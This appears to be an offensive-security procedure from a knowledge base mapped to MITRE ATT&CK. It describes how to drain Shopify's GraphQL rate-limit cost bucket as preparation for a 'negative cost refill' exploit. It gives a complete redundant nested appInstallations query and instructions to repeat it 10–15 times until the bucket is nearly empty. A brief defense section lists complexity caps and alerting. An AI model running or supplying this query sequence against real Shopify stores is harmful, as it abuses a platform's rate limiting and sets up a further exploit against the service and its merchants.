---
tags:
  - graphql
  - shopify
  - rate-limit-depletion
type: procedure
tools:
  - '[[tools/Shopify-GraphiQL-App]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/high-cost-appinstallations-query]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:25:53.334Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: a863217f-b3b7-4d88-b931-724bba0720a6
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
---
# Deplete-Shopify-GraphQL-Rate-Limit-Bucket

## Summary

Deplete the GraphQL query cost bucket by repeatedly executing high-cost queries with nested fields, reducing points to a low level (e.g., 50) to prepare for the negative cost refill.

## Description

High-complexity GraphQL queries, such as those querying appInstallations with multiple nested accessScopes and metafields, consume significant points (e.g., 100+ per query). Repeating these 10-15 times exhausts the 1000-point bucket, simulating a throttled state that the negative cost exploit can reverse.

## Requirements

1. GraphiQL app access with full bucket
2. Knowledge of query cost from documentation
3. Ability to monitor bucket points in responses

## Defense

Defensive measures and detection strategies:

- Cap maximum query complexity per request
- Implement burst limits alongside cost buckets
- Alert on rapid high-cost query sequences

## Objectives

1. Reduce bucket to near-exhaustion without triggering full throttle
2. Confirm depletion via response extensions
3. Set up conditions for refill exploitation

## Instructions

### Step 1: Craft High-Cost Query

**Context**: Build a query with redundant nested fields to maximize cost.

**Command** ([[commands/high-cost-appinstallations-query]]):
```graphql
{
  appInstallations(first: 10) {
    edges {
      node {
        id
        uninstallUrl
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        launchUrl
        app {
          pricingDetailsSummary
          apiKey
          banner {
            altText
            metafields(first: 2) {
              edges {
                node {
                  description
                  value
                  namespace
                  id
                }
              }
            }
          }
        }
        handle
        features
        pricingDetails
        published
        feedback {
          messages {
            message
          }
          link {
            url
          }
        }
      }
    }
  }
}
```

> Each execution deducts ~70-100 points; monitor 'throttleStatus' in response.

### Step 2: Repeat Until Depleted

**Context**: Execute 10-15 times until bucket ~50 points.

Repeat the above command in GraphiQL.

> Expected: Bucket points decrease progressively; stop when low.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service

### Sub-Techniques


## Commands Used

- [[commands/high-cost-appinstallations-query]]

## Tools Used

- [[tools/Shopify-GraphiQL-App]]

## Tags

- graphql
- shopify
- rate-limit-depletion
